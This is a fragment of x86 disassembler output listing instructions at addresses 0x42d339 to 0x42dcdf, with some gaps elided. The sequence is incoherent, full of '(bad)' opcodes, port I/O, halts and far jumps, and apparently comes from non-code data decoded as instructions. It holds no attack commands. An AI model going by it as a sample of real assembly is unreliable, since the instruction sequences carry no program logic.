  42d339:	jno    0x42d380
  42d33b:	pop    DWORD PTR [edx+0x428fa5e0]
  42d341:	int    0xfb
  42d343:	mov    esi,0xe55dd444
  42d348:	lds    ebp,FWORD PTR [ebp+0x4843a184]
  42d34e:	in     eax,dx
  42d34f:	mov    ecx,0x30df8489
  42d354:	in     eax,0x92
  42d356:	pop    ecx
  42d357:	cmp    BYTE PTR [esi],0xd
  42d35a:	stc    
  42d35b:	lahf   
  42d35c:	push   0x7c
  42d35e:	add    al,0xf7
  42d360:	sbb    DWORD PTR [ebp+edi*4+0xb],0xc630e1f4
  42d368:	sub    bh,BYTE PTR [ebp-0x141602cc]
  42d36e:	in     al,dx
  42d36f:	jg     0x42d36a
  42d371:	mov    ecx,0x623d186d
  42d376:	inc    eax
  42d377:	cli    
  42d378:	inc    esi
  42d379:	xchg   edx,eax
  42d37a:	hlt    
  42d37b:	and    ch,ah
  42d37d:	add    esp,esi
  42d37f:	das    
  42d380:	jo     0x42d328
  42d382:	cmp    BYTE PTR [edi],bh
  42d384:	imul   ebx,DWORD PTR [eax],0x2
  42d387:	or     BYTE PTR [edx+ebp*4-0x2b],ah
  42d38b:	test   DWORD PTR [esi+0x7b],esi
  42d38e:	push   0xf264d7c6
  42d393:	lahf   
  42d394:	pop    ecx
  42d395:	shl    DWORD PTR [edx+0x44],1
  42d398:	fidiv  DWORD PTR [eax-0x6f]
  42d39b:	xchg   ebx,eax
  42d39c:	les    esi,FWORD PTR [eax+0x5f]
  42d39f:	aam    0x64
  42d3a1:	shl    DWORD PTR [esp+eiz*8],cl
  42d3a4:	repz push 0xfffffff5
  42d3a7:	call   0xdcb1924b
  42d3ac:	jecxz  0x42d3a8
  42d3ae:	(bad)  
  42d3b0:	sub    al,0xe4
  42d3b2:	cmc    
  42d3b3:	cmp    DWORD PTR [edi+0x144e8fbb],ebx
  42d3b9:	adc    ecx,DWORD PTR [edx]
  42d3bb:	lds    edx,FWORD PTR [esi+0x4a75c161]
  42d3c1:	jg     0x42d3bc
  42d3c3:	xchg   edx,eax
  42d3c4:	aas    
  42d3c5:	push   cs
  42d3c6:	sub    al,0x96
  42d3c8:	inc    ebx
  42d3c9:	xchg   eax,ecx
  42d3cb:	push   ecx
  42d3cc:	sbb    BYTE PTR [edx+ebx*2+0x1dd1a8e4],0x97
  42d3d4:	(bad)  
  42d3d5:	mov    eax,0x9c95a0e9
  42d3da:	adc    al,0x7c
  42d3dc:	sbb    DWORD PTR [esi],ebx
  42d3de:	mov    ch,0x5c
  42d3e0:	shr    dh,1
  42d3e2:	cwde   
  42d3e3:	mov    ecx,0xd3a7e499
  42d3e8:	stc    
  42d3e9:	stos   DWORD PTR es:[edi],eax
  42d3ea:	cmc    
  42d3eb:	in     eax,0x2b
  42d3ed:	in     eax,dx
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	iret   
  42d463:	mov    ebp,0xe5670fa2
  42d468:	add    DWORD PTR [eax],eax
  42d46a:	add    BYTE PTR [ecx],al
  42d46c:	add    BYTE PTR [eax],al
  42d46e:	test   ch,dh
  42d470:	push   esi
  42d471:	push   edi
  42d472:	icebp  
  42d473:	ss es mov ah,0x52
  42d477:	in     eax,dx
  42d478:	popa   
  42d479:	das    
  42d47a:	mov    DWORD PTR [eax-0x782d649],ebp
  42d480:	gs mov ah,0x40
  42d483:	pop    eax
  42d484:	push   cs
  42d485:	leave  
  42d486:	ins    BYTE PTR es:[edi],dx
  42d487:	sub    eax,0xe4fe8d43
  42d48c:	scas   al,BYTE PTR es:[edi]
  42d48d:	add    esi,DWORD PTR cs:[ebp-0x4f]
  42d491:	push   edi
  42d492:	jge    0x42d468
  42d494:	(bad)  
  42d495:	loopne 0x42d463
  42d497:	cmp    al,0x96
  42d499:	nop
  42d49a:	out    dx,eax
  42d49b:	addr16 jnp 0x42d49a
  42d49e:	pop    esp
  42d49f:	mov    ebp,0xe37eae0a
  42d4a4:	xor    al,0x25
  42d4a6:	retf   
  42d4a7:	enter  0x63e3,0xc0
  42d4ab:	mov    bl,BYTE PTR [ebx]
  42d4ad:	ja     0x42d4cc
  42d4af:	cli    
  42d4b0:	rcl    BYTE PTR [ebp-0x6c],0xc9
  42d4b4:	jb     0x42d45d
  42d4b6:	sub    al,0x7b
  42d4b8:	mov    ecx,0x488941c1
  42d4bd:	std    
  42d4be:	adc    al,0xf2
  42d4c0:	inc    ebx
  42d4c1:	mov    ebx,0xdf15634e
  42d4c6:	add    BYTE PTR [ebx],bl
  42d4c8:	into   
  42d4c9:	(bad)  
  42d4ca:	cmc    
  42d4cb:	cli    
  42d4cc:	or     DWORD PTR [esi],ecx
  42d4ce:	push   es
  42d4cf:	mov    edi,0x9f2e7014
  42d4d4:	sbb    ah,BYTE PTR [ebx+0x6bb3231a]
  42d4da:	(bad)  
  42d4dc:	in     al,dx
  42d4dd:	mov    bh,0x6b
  42d4df:	out    0x22,al
  42d4e1:	mov    cl,0x45
  42d4e3:	xchg   esp,eax
  42d4e4:	out    0x9f,al
  42d4e6:	xchg   DWORD PTR [ebp-0x4c],esi
  42d4e9:	test   al,0xfb
  42d4eb:	mov    eax,ds:0x45fb21ae
  42d4f0:	popf   
  42d4f1:	leave  
  42d4f2:	adc    DWORD PTR [eax+0x6],ebx
  42d4f5:	call   0xbc16378e
  42d4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4fb:	sub    DWORD PTR [eax],edi
  42d4fd:	scas   eax,DWORD PTR es:[edi]
  42d4fe:	add    dh,cl
  42d500:	mov    al,0x83
  42d502:	ja     0x42d54c
  42d504:	imul   esp,DWORD PTR [eax+0x18],0xffffffc6
  42d508:	pop    ebp
  42d509:	xor    ebp,ebx
  42d50b:	sbb    al,0x1c
  42d50d:	sbb    BYTE PTR [esi-0x48],ch
  42d510:	sub    BYTE PTR [ebx+edx*2+0x43],0xea
  42d515:	adc    cl,BYTE PTR [ebp-0x64]
  42d518:	sub    al,0x5a
  42d51a:	sbb    BYTE PTR [ebp-0x37616f64],dl
  42d520:	cmp    bl,BYTE PTR [ebx-0x48eac9b9]
  42d526:	out    dx,eax
  42d527:	cwde   
  42d528:	sbb    eax,0xc2a53d3c
  42d52d:	mov    dh,0x31
  42d52f:	or     ebx,DWORD PTR [ecx+0x78]
  42d532:	adc    dh,BYTE PTR [edi-0x7d585a2f]
  42d538:	cmp    BYTE PTR [ebx],ah
  42d53a:	xor    BYTE PTR [ebx],bl
  42d53c:	cwde   
  42d53d:	mov    bl,0x2d
  42d53f:	mov    eax,ds:0xb014c1cf
  42d544:	sub    DWORD PTR [edx+0x2e],0x42fb3210
  42d54b:	cld    
  42d54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d54d:	addr16 xchg edi,eax
  42d54f:	out    dx,eax
  42d550:	push   0x7574883a
  42d555:	cmp    BYTE PTR [esi-0xa],bl
  42d558:	test   DWORD PTR [ebp-0x22],esp
  42d55b:	in     eax,0x8d
  42d55d:	js     0x42d51d
  42d55f:	loopne 0x42d5dd
  42d561:	out    dx,eax
  42d562:	cmp    ecx,DWORD PTR [esi]
  42d564:	mov    cl,0x54
  42d566:	jnp    0x42d4f4
  42d568:	dec    ebp
  42d569:	mov    esp,0x2f61d4d3
	...
  42d5d6:	cdq    
  42d5d7:	cmc    
  42d5d8:	adc    BYTE PTR [ebx-0x12],0x77
  42d5dc:	fcos   
  42d5de:	pop    ebp
  42d5df:	mov    ds:0x824d1ed5,eax
  42d5e5:	mov    ah,0x67
  42d5e7:	out    0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    BYTE PTR [eax+ebp*1-0x18],cl
  42d5f1:	ins    DWORD PTR es:[edi],dx
  42d5f2:	sub    ah,dh
  42d5f4:	xor    dl,BYTE PTR [esi+0x355478ec]
  42d5fa:	nop
  42d5fb:	ins    DWORD PTR es:[edi],dx
  42d5fc:	mov    al,ds:0x5a450d9f
  42d601:	pop    esp
  42d602:	shl    BYTE PTR [esi-0x60],1
  42d605:	aam    0x1e
  42d607:	and    al,0x88
  42d609:	mov    WORD PTR [ecx-0x60],?
  42d60c:	push   ss
  42d60d:	sub    edx,DWORD PTR [edx]
  42d60f:	outs   dx,DWORD PTR ds:[esi]
  42d610:	cli    
  42d611:	push   0xa5e81e33
  42d616:	out    0x78,eax
  42d618:	and    eax,0x8375b1c9
  42d61d:	add    DWORD PTR [edx-0x6853b10b],ecx
  42d623:	add    al,bh
  42d625:	daa    
  42d626:	div    bl
  42d628:	or     DWORD PTR ds:0xd67847a2,ebp
  42d62e:	sti    
  42d62f:	xchg   esi,eax
  42d630:	imul   ecx,esi,0x2f
  42d633:	pop    ds
  42d634:	(bad)  
  42d635:	sbb    al,0x90
  42d637:	and    esi,ebx
  42d639:	cdq    
  42d63a:	add    ebp,ebp
  42d63c:	mov    esp,edi
  42d63e:	cwde   
  42d63f:	into   
  42d640:	mov    al,ds:0x84f865cb
  42d645:	dec    ebx
  42d646:	adc    esi,ebx
  42d648:	push   ebp
  42d649:	sbb    DWORD PTR [ebp+eax*2+0x5232cd9e],esp
  42d650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d651:	inc    ebx
  42d652:	adc    al,0x89
  42d654:	std    
  42d655:	enter  0x8938,0xc3
  42d659:	inc    edx
  42d65a:	(bad)  
  42d65b:	fisttp WORD PTR [edi]
  42d65d:	or     eax,0x7b480055
  42d662:	pusha  
  42d663:	push   ebp
  42d664:	lahf   
  42d665:	jo     0x42d6ad
  42d667:	sub    eax,0xee47e697
  42d66c:	dec    esp
  42d66d:	stos   DWORD PTR es:[edi],eax
  42d66e:	jl     0x42d62a
  42d670:	jmp    0x1362:0xa28b72da
  42d677:	mov    bl,0x40
  42d679:	jnp    0x42d6a1
  42d67b:	pusha  
  42d67c:	inc    esp
  42d67d:	mov    ch,BYTE PTR [ebx]
  42d67f:	mov    fs,WORD PTR [edx-0x2c5ad78f]
  42d685:	pop    edx
  42d686:	(bad)  
  42d687:	lea    eax,[eax+0x69]
  42d68a:	pushf  
  42d68b:	fld    QWORD PTR [eax-0x22b36486]
  42d691:	sbb    DWORD PTR [ecx-0x4a],ecx
  42d694:	rol    BYTE PTR [ebx],1
  42d696:	jle    0x42d654
  42d698:	daa    
  42d699:	out    0x2a,al
  42d69b:	ret    
  42d69c:	push   es
  42d69d:	mov    ?,WORD PTR [edi]
  42d69f:	push   esi
  42d6a0:	dec    eax
  42d6a1:	sub    eax,0x5cdcfb2d
  42d6a6:	pop    edx
  42d6a7:	or     DWORD PTR [edx+0x4b],eax
  42d6aa:	cld    
  42d6ab:	(bad)  
  42d6ac:	(bad)  
  42d6ad:	push   ss
  42d6ae:	jl     0x42d6ee
  42d6b0:	add    ebp,ebx
  42d6b2:	fs sub al,0x46
  42d6b5:	xchg   esi,eax
  42d6b6:	push   edx
  42d6b7:	mov    al,0xa7
  42d6b9:	inc    eax
  42d6ba:	lods   eax,DWORD PTR ds:[esi]
  42d6bb:	(bad)  
  42d6bd:	or     eax,DWORD PTR [esi-0x35]
  42d6c0:	jp     0x42d6e6
  42d6c2:	in     al,0x97
  42d6c4:	jno    0x42d726
  42d6c6:	stos   BYTE PTR es:[edi],al
  42d6c7:	hlt    
  42d6c8:	call   0x7a1a:0xd9e83c4f
  42d6cf:	in     al,dx
  42d6d0:	ja     0x42d718
  42d6d2:	xchg   esp,eax
  42d6d3:	cdq    
  42d6d4:	loopne 0x42d6e6
  42d6d6:	pop    es
  42d6d7:	xor    edi,ebx
  42d6d9:	stos   BYTE PTR es:[edi],al
  42d6da:	cmc    
  42d6db:	sbb    eax,0x40ab7370
  42d6e0:	rcr    ebp,1
  42d6e2:	jecxz  0x42d74a
  42d6e4:	repz and al,0xa9
  42d6e7:	push   cs
  42d6e8:	push   esi
  42d6e9:	mov    al,0x6f
  42d6eb:	ret    0x9b6d
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x96
  42d763:	xor    eax,0xe767c6a1
  42d768:	add    DWORD PTR [eax],eax
  42d76a:	add    BYTE PTR [ecx],al
  42d76c:	add    BYTE PTR [eax],al
  42d76e:	imul   ecx,ebx,0x36
  42d771:	sbb    ebx,ecx
  42d773:	lods   eax,DWORD PTR ds:[esi]
  42d774:	mov    ch,0xa7
  42d776:	or     al,0xab
  42d778:	and    ah,0xf5
  42d77b:	sbb    BYTE PTR [edi],ch
  42d77d:	jb     0x42d753
  42d77f:	loop   0x42d717
  42d781:	rcl    BYTE PTR [ecx-0x4108c412],cl
  42d787:	xchg   esi,eax
  42d788:	int3   
  42d789:	std    
  42d78a:	or     dh,BYTE PTR [edi+0x43]
  42d78d:	popa   
  42d78e:	add    dl,BYTE PTR [ebx]
  42d790:	mov    eax,0x52660fcf
  42d795:	cmp    edx,edi
  42d797:	mov    bh,0x98
  42d799:	std    
  42d79a:	leave  
  42d79b:	push   0xffffffaa
  42d79d:	test   BYTE PTR [edx],0xb3
  42d7a0:	mov    dh,0xd0
  42d7a2:	(bad)  
  42d7a3:	mov    BYTE PTR [ecx-0x26d9a0e4],cl
  42d7a9:	mov    al,ds:0xa14c10ee
  42d7ae:	rol    BYTE PTR [eax+0x16711475],1
  42d7b4:	ins    DWORD PTR es:[edi],dx
  42d7b5:	pusha  
  42d7b6:	push   ecx
  42d7b7:	jns    0x42d7b9
  42d7b9:	mov    edi,0x3ecb1fa0
  42d7be:	fdiv   DWORD PTR [esi]
  42d7c0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42d7c2:	das    
  42d7c3:	in     eax,dx
  42d7c4:	in     al,0x4
  42d7c6:	retf   0xd323
  42d7c9:	xor    dl,BYTE PTR [ebp+0x4ecda1e8]
  42d7cf:	es cs enter 0x2c70,0xcd
  42d7d5:	retf   
  42d7d6:	(bad)  [edx+ecx*2-0x27]
  42d7da:	and    eax,0x3df828f7
  42d7df:	mov    dh,0x62
  42d7e1:	mov    eax,0x7a9900ad
  42d7e6:	out    dx,eax
  42d7e7:	inc    esp
  42d7e8:	call   0x3ca9e536
  42d7ed:	mov    eax,0x3a918907
  42d7f2:	push   eax
  42d7f3:	gs das 
  42d7f5:	sub    bh,ah
  42d7f7:	mov    al,ds:0x7e8827d9
  42d7fc:	sbb    eax,0xc06038ee
  42d801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d802:	(bad)  
  42d803:	mov    ds:0x55fdf64a,al
  42d808:	cld    
  42d809:	sbb    al,0xba
  42d80b:	mov    WORD PTR [eax+ebp*8+0x2c],ds
  42d80f:	jl     0x42d876
  42d811:	sbb    BYTE PTR ds:0x9cbd858d,bh
  42d817:	xor    al,0xed
  42d819:	popa   
  42d81a:	xchg   esp,eax
  42d81b:	lods   al,BYTE PTR ds:[esi]
  42d81c:	and    ecx,0x42cb6dfe
  42d822:	xor    cl,BYTE PTR [eax+ebx*2+0x4d]
  42d826:	mov    dh,ch
  42d828:	das    
  42d829:	inc    eax
  42d82a:	rol    bl,cl
  42d82c:	int    0x84
  42d82e:	jae    0x42d884
  42d830:	ds sub al,0x74
  42d833:	and    al,0xb2
  42d835:	mov    ebp,0xf8260d12
  42d83a:	aaa    
  42d83b:	mov    BYTE PTR [esi+0x25283a67],dh
  42d841:	ret    
  42d842:	and    DWORD PTR [ebx-0x62],ecx
  42d845:	xor    al,0x5e
  42d847:	jnp    0x42d860
  42d849:	in     al,0xa7
  42d84b:	xor    ah,BYTE PTR [ecx]
  42d84d:	mov    eax,0xaea75c37
  42d852:	hlt    
  42d853:	or     BYTE PTR [ebp+0x66],bh
  42d856:	adc    al,0xe1
  42d858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d859:	fwait
  42d85a:	add    esp,esi
  42d85c:	inc    ebx
  42d85d:	into   
  42d85e:	xor    al,0x8d
  42d860:	sbb    DWORD PTR cs:[eax],eax
  42d863:	pmulhuw mm6,QWORD PTR [ebx+0x26]
  42d867:	inc    esi
  42d868:	pop    ecx
  42d869:	jne    0x42d804
  42d86b:	cs pop ds
  42d86d:	cmc    
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x67c6961a
  42d8e3:	gs dec ebx
  42d8e5:	(bad)  
  42d8e6:	addr16 call 0x142d8ed
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	lahf   
  42d8ef:	call   0x61a5:0x2d4a3e7a
  42d8f6:	cli    
  42d8f7:	mov    esp,0x443911aa
  42d8fc:	mov    al,ds:0x665be759
  42d901:	pop    ebp
  42d902:	cmp    al,BYTE PTR [edi+0x65]
  42d905:	mov    gs,WORD PTR [edi-0x35]
  42d908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d909:	data16 aad 0x62
  42d90c:	daa    
  42d90d:	fwait
  42d90e:	sub    al,0x10
  42d910:	xchg   esi,eax
  42d911:	enter  0xeaca,0xbf
  42d915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d916:	pop    es
  42d917:	mov    BYTE PTR [edx+ebp*2+0x10f5766e],0xd3
  42d91f:	jle    0x42d8be
  42d921:	shr    ebx,0x27
  42d924:	mov    al,0x64
  42d926:	dec    edi
  42d927:	or     al,0x54
  42d929:	ror    dl,0x4d
  42d92c:	add    ch,BYTE PTR [eax+0x4f]
  42d92f:	sbb    al,0xe4
  42d931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d932:	xor    eax,0xcda9ad9c
  42d937:	ret    0xfbb3
  42d93a:	mov    WORD PTR [edi+0x53],?
  42d93d:	sbb    DWORD PTR [ebp+edx*4-0x7c53b5ba],ebx
  42d944:	mov    ebx,ebp
  42d946:	jae    0x42d8f8
  42d948:	mov    ds:0x1b0e9914,al
  42d94d:	cmp    ah,BYTE PTR [edi-0xf]
  42d950:	shl    BYTE PTR [esi],0x69
  42d953:	or     BYTE PTR [ebp-0x6b],dh
  42d956:	in     eax,dx
  42d957:	sbb    eax,0x7d294979
  42d95c:	imul   ah
  42d95e:	adc    eax,0x4aee8114
  42d963:	push   edi
  42d964:	not    BYTE PTR [ebp-0x56]
  42d967:	adc    ah,BYTE PTR [edx+0x14]
  42d96a:	or     dh,BYTE PTR [esi]
  42d96c:	frstor [ebp-0x5]
  42d96f:	push   esi
  42d970:	adc    edx,eax
  42d972:	jbe    0x42d911
  42d974:	and    al,0xf1
  42d976:	daa    
  42d977:	out    0xe3,al
  42d979:	loop   0x42d92c
  42d97b:	and    BYTE PTR [ebp+0x7f],ch
  42d97e:	jmp    0x9215055d
  42d983:	and    BYTE PTR [edx+0x20a0e404],0xc6
  42d98a:	test   esi,ecx
  42d98c:	xor    cl,0x84
  42d98f:	xchg   BYTE PTR [ecx-0x7147463b],dh
  42d995:	push   0x1fe49b71
  42d99a:	data16 scas al,BYTE PTR es:[edi]
  42d99c:	add    ebp,esi
  42d99e:	(bad)  
  42d99f:	sub    DWORD PTR [eax-0x7a],eax
  42d9a2:	dec    edx
  42d9a3:	or     al,0x6f
  42d9a5:	xchg   esp,eax
  42d9a6:	shr    DWORD PTR [ebx+0x55460730],0x9
  42d9ad:	jo     0x42d9b5
  42d9af:	sbb    ecx,DWORD PTR [edx+0x71]
  42d9b2:	dec    eax
  42d9b3:	xchg   ebp,eax
  42d9b4:	push   0xffffffea
  42d9b6:	call   0x893b1bee
  42d9bb:	mov    ds:0x22d5bcc0,al
  42d9c0:	mov    ecx,0x7fd791
  42d9c5:	pop    ds
  42d9c6:	shl    DWORD PTR [eax-0x6e],1
  42d9c9:	sub    DWORD PTR [eax+0x73bfc41],eax
  42d9cf:	cmp    ecx,DWORD PTR [ecx-0x39742f25]
  42d9d5:	xchg   ebp,eax
  42d9d6:	mov    esi,0x57e4d457
  42d9db:	xor    cl,dl
  42d9dd:	out    0xe3,eax
  42d9df:	add    ebx,DWORD PTR [edi+edx*1]
  42d9e2:	xchg   ebp,eax
  42d9e3:	jns    0x42d9c4
  42d9e5:	mov    ecx,0xc5757fce
  42d9ea:	aaa    
  42d9eb:	jmp    DWORD PTR [eax+0x9]
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	or     al,0x76
  42da64:	add    eax,0x1e9672b
  42da69:	add    BYTE PTR [eax],al
  42da6b:	add    DWORD PTR [eax],eax
  42da6d:	add    BYTE PTR [ebp+0x31],dl
  42da70:	push   edi
  42da71:	(bad)  
  42da72:	mov    esp,0x2bff08e0
  42da77:	out    0x55,al
  42da79:	mov    ch,0xb2
  42da7b:	test   eax,0xc0d75d2f
  42da80:	in     eax,0x47
  42da82:	or     esp,DWORD PTR [eax]
  42da84:	add    BYTE PTR [edx+0x36],ah
  42da87:	sub    al,0xe3
  42da89:	out    0x31,eax
  42da8b:	sub    ebx,DWORD PTR [esi]
  42da8d:	xor    dl,BYTE PTR [eax+0x4f1190f6]
  42da93:	int    0xe0
  42da95:	jnp    0x42da1f
  42da97:	shl    BYTE PTR ds:0xe16f05cf,0xe
  42da9e:	bound  edx,QWORD PTR [ebx]
  42daa0:	sahf   
  42daa1:	lds    ebx,FWORD PTR [edi+esi*2-0x42]
  42daa5:	add    ecx,DWORD PTR [edi]
  42daa7:	push   eax
  42daa8:	icebp  
  42daa9:	dec    edi
  42daaa:	or     al,0x28
  42daac:	add    eax,0x201092a5
  42dab1:	nop
  42dab2:	inc    eax
  42dab3:	not    esp
  42dab5:	sub    al,0x97
  42dab7:	pop    edi
  42dab8:	add    eax,0x7e61d122
  42dabd:	cli    
  42dabe:	stc    
  42dabf:	add    BYTE PTR [ebx+ebx*4-0x12a2d707],cl
  42dac6:	pop    esp
  42dac7:	jg     0x42da79
  42dac9:	inc    ebx
  42daca:	dec    esi
  42dacb:	mov    al,0xdd
  42dacd:	jb     0x42da97
  42dacf:	xchg   edx,eax
  42dad0:	int3   
  42dad1:	scas   eax,DWORD PTR es:[edi]
  42dad2:	(bad)  
  42dad3:	out    0xb1,al
  42dad5:	mov    cl,0x40
  42dad7:	mov    bh,BYTE PTR [ecx+ebx*4-0x4a]
  42dadb:	pop    edi
  42dadc:	pop    ecx
  42dadd:	jae    0x42daa9
  42dadf:	jge    0x42db01
  42dae1:	mov    ch,0xc5
  42dae3:	cmc    
  42dae4:	xor    BYTE PTR [edx+ecx*4],dl
  42dae7:	cmp    al,0x3d
  42dae9:	nop
  42daea:	fistp  DWORD PTR [esi+0x4d]
  42daed:	cs aaa 
  42daef:	add    BYTE PTR [ecx+0x26],al
  42daf2:	das    
  42daf3:	mov    dl,0xe7
  42daf5:	inc    edi
  42daf6:	pop    ecx
  42daf7:	xlat   BYTE PTR ds:[ebx]
  42daf8:	cwde   
  42daf9:	stos   DWORD PTR es:[edi],eax
  42dafa:	jmp    0x1b7:0xcd6f44aa
  42db01:	lock cmp DWORD PTR [edx-0x720256e1],esi
  42db08:	icebp  
  42db09:	jo     0x42dad6
  42db0b:	ror    DWORD PTR [edi+0x1a],0x11
  42db0f:	loopne 0x42dad8
  42db11:	and    BYTE PTR [ebx],bl
  42db13:	and    dl,dh
  42db15:	stc    
  42db16:	and    cl,bh
  42db18:	pop    esp
  42db19:	push   esp
  42db1a:	gs loopne 0x42db29
  42db1d:	call   0x69cf37b1
  42db22:	nop
  42db23:	(bad)  
  42db24:	sbb    ebx,DWORD PTR [esi-0x7]
  42db27:	sub    cl,BYTE PTR gs:[ebx-0x1]
  42db2b:	pop    ecx
  42db2c:	out    0xf,al
  42db2e:	adc    DWORD PTR [ebx-0x128ef968],ecx
  42db34:	mov    esp,0x23d89a95
  42db39:	push   ebp
  42db3a:	scas   eax,DWORD PTR es:[edi]
  42db3b:	mov    ebp,0x92e51a7c
  42db40:	mov    bl,0x1c
  42db42:	in     al,0xa3
  42db44:	ror    BYTE PTR [ecx],1
  42db46:	mul    ebp
  42db48:	std    
  42db49:	mov    DWORD PTR [eax+0x41],0x7ef73fc
  42db50:	data16 ficom DWORD PTR [edi-0x51f09dfc]
  42db57:	push   es
  42db58:	sub    al,0x2e
  42db5a:	sub    BYTE PTR [ebx-0x72],cl
  42db5d:	jmp    0x9c955648
  42db62:	ss adc eax,0x543fc4a4
  42db68:	or     al,dl
  42db6a:	xchg   esi,eax
  42db6b:	pushf  
  42db6c:	stos   BYTE PTR es:[edi],al
  42db6d:	add    BYTE PTR ds:[eax],al
	...
  42dbd4:	add    BYTE PTR [eax],al
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbc2
  42dbe3:	xlat   BYTE PTR ds:[ebx]
  42dbe4:	push   cs
  42dbe5:	mul    BYTE PTR [edi-0x16]
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	add    BYTE PTR [ecx],al
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	and    dl,dh
  42dbf0:	(bad)  
  42dbf1:	into   
  42dbf2:	or     DWORD PTR [edx+0x10],edx
  42dbf5:	mov    dl,0xc1
  42dbf7:	dec    edx
  42dbf8:	pop    es
  42dbf9:	or     al,0xa4
  42dbfb:	fdivp  st(3),st
  42dbfd:	jmp    0x42dbe5
  42dbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc00:	pop    edi
  42dc01:	add    DWORD PTR [ecx-0x481c3223],eax
  42dc07:	jne    0x42dbc8
  42dc09:	nop
  42dc0a:	sti    
  42dc0b:	pop    esi
  42dc0c:	fidivr DWORD PTR [eax+0xcb257da]
  42dc12:	les    esi,FWORD PTR cs:[edx]
  42dc15:	mov    al,ds:0x3bd508d8
  42dc1a:	pop    ebx
  42dc1b:	xor    eax,0x3394d492
  42dc20:	(bad)  
  42dc21:	xlat   BYTE PTR ds:[ebx]
  42dc22:	dec    eax
  42dc23:	pop    esp
  42dc24:	shl    esp,0xd9
  42dc27:	jecxz  0x42dc40
  42dc29:	inc    edx
  42dc2a:	sbb    al,0x81
  42dc2c:	adc    dl,dl
  42dc2e:	mov    edi,DWORD PTR [esi]
  42dc30:	aaa    
  42dc31:	je     0x42dc37
  42dc33:	mov    ecx,0x3d6f0a6e
  42dc38:	cmp    dh,BYTE PTR [edi]
  42dc3a:	sahf   
  42dc3b:	(bad)  
  42dc3c:	sbb    al,0x69
  42dc3e:	test   BYTE PTR [edi+0x7c26cbfd],dl
  42dc44:	es push 0xffffffc0
  42dc47:	or     cl,dh
  42dc49:	repnz or BYTE PTR [esi+0x35],cl
  42dc4d:	popa   
  42dc4e:	mov    ecx,0x5ecbd1b1
  42dc53:	ins    DWORD PTR es:[edi],dx
  42dc54:	adc    esi,DWORD PTR [edx]
  42dc56:	loop   0x42dc0a
  42dc58:	xchg   ecx,eax
  42dc59:	push   ebx
  42dc5a:	je     0x42dc1a
  42dc5c:	imul   ebp,DWORD PTR [edi+0x7f7b1aa7],0x88d000c6
  42dc66:	xor    esp,DWORD PTR [ebx]
  42dc68:	adc    eax,0x478c857e
  42dc6d:	jo     0x42dc16
  42dc6f:	mov    eax,edx
  42dc71:	pop    ebp
  42dc72:	mov    ah,0x67
  42dc74:	sbb    ch,BYTE PTR [ebx+0xd831cad]
  42dc7a:	lods   eax,DWORD PTR ds:[esi]
  42dc7b:	lahf   
  42dc7c:	mov    ecx,0x99b5ec07
  42dc81:	sub    dl,BYTE PTR [esi-0x56f1d036]
  42dc87:	push   ds
  42dc88:	test   al,0xc
  42dc8a:	into   
  42dc8b:	ss out 0xca,al
  42dc8e:	fisub  WORD PTR [edi+0xc]
  42dc91:	popf   
  42dc92:	fcmovne st,st(3)
  42dc94:	inc    eax
  42dc95:	into   
  42dc96:	int    0x63
  42dc98:	icebp  
  42dc99:	pop    eax
  42dc9a:	test   cl,dh
  42dc9c:	adc    al,0x18
  42dc9e:	lods   al,BYTE PTR ds:[esi]
  42dc9f:	lods   eax,DWORD PTR ds:[esi]
  42dca0:	sub    eax,0xfbbf974d
  42dca5:	pop    ecx
  42dca6:	cmp    eax,0x583d098c
  42dcab:	scas   eax,DWORD PTR es:[edi]
  42dcac:	jp     0x42dd08
  42dcae:	adc    DWORD PTR [eax+ebx*2-0x3b],ebp
  42dcb2:	in     eax,dx
  42dcb3:	mov    dl,0x1e
  42dcb5:	es xchg esp,eax
  42dcb7:	aad    0xf3
  42dcb9:	sbb    DWORD PTR ds:0x989005b0,esp
  42dcbf:	cs sub al,0x50
  42dcc2:	xchg   ebp,eax
  42dcc3:	iret   
  42dcc4:	sbb    esi,eax
  42dcc6:	xor    eax,ecx
  42dcc8:	xchg   eax,eax
  42dcca:	pop    ebx
  42dccb:	stc    
  42dccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dccd:	inc    edx
  42dcce:	shl    bh,1
  42dcd0:	out    dx,eax
  42dcd1:	cmp    edx,DWORD PTR [esi-0x5f]
  42dcd4:	fisub  WORD PTR [ebx-0x4a569fbc]
  42dcda:	sub    eax,0x60ad6be4
  42dcdf:	dec    ecx
